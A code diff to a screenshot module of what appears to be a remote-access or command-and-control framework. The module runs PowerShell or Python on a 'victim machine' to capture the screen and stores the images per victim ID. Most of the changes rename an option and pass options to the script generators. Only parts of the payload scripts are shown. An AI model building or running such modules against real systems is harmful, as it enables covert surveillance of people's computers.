@@ -12,16 +12,17 @@ class Screenshot(Module):
 	@classmethod
 	def module_options(cls):
 		h = {
-			'Path' : 'Directory to download the screenshot on the server. Default is victim_data/<victim_id>' 
+			'path' : 'Directory to download the screenshot on the server. Default is victim_data/<victim_id>' 
 		}
 		return h
 
-	def __init__(self,name,utility,language):
+	def __init__(self,name,utility,language,options):
 
 		description = 'This module takes a screenshot on the victim machine using the python mss module.'
+		## We are loading the script in the script variable here
+		super(Screenshot, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")(options))    
 
-		super(Screenshot, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")())    
-
+	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
 	def handle_task_output(self,data,options,victim_id):
 
 		## Default Dumping path
@@ -33,11 +34,11 @@ class Screenshot(Module):
 		filename = "screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png"
 		ss_path = os.path.join(dump_path,filename)
 
-		if 'Path' in  options:
-			if not os.path.exists(options['Path']):
-				print(f"Provided save path does not exists - {options['Path']}. Saving to default directory {ss_path}")
+		if 'path' in  options:
+			if not os.path.exists(options['path']):
+				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {ss_path}")
 			else:
-				ss_path = os.path.join(options['Path'],filename)
+				ss_path = os.path.join(options['path'],filename)
 
 		## Screenshot is base64 encoded
 		b64encoded_string = data
@@ -53,7 +54,7 @@ class Screenshot(Module):
 		return output
 
 
-	def script_powershell(self):
+	def script_powershell(self,options):
 		return """[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | out-null
         function screenshot([Drawing.Rectangle]$bounds) {
 
@@ -79,7 +80,7 @@ class Screenshot(Module):
 
         return $bytes"""
 
-	def script_python(self):
+	def script_python(self,options):
 		return """def execute_command():
         from mss import mss
         import os
